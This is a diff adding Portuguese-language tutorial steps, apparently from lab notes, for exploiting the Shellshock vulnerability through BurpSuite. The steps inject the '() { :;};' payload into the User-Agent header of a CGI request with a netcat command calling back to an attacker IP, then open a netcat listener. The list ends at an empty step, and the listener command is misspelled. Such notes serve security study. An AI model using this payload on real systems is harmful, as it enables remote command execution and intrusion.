@@ -12,6 +12,16 @@ Shellshock é uma vunerabilidade antiga, improvável de ser encontrada atualment
 
 ## Análise do fluxo com BurpSuite
 
-
+1. Abra o BurpSuite
+2. Na guia **Proxy**, abra o browser do BurpSuite. Ele já vem configurado com atribuições de proxy.
+3. No browser digite o IP da máquina alvo para abrir o seu website
+4. Abra a aba **Target/SiteMap** do BurpSuite
+5. Clique no método GET ditetório /cgi-bin/status.
+  - Obeserve a linha **User-agente** do **request**
+  - Substitua pelo comando nulo `() { :;}; `
+  - Adicione o comando que deseja executar no alvo. Ex.: `nc 192.168.1.10 5555` (para conexão com o IP da máquina de ataque)
+6. Na máquina de ataque inicie o netcat modo listener para conecção com o alvo `ns -lpv 5555`
+7. 
+    
 
 
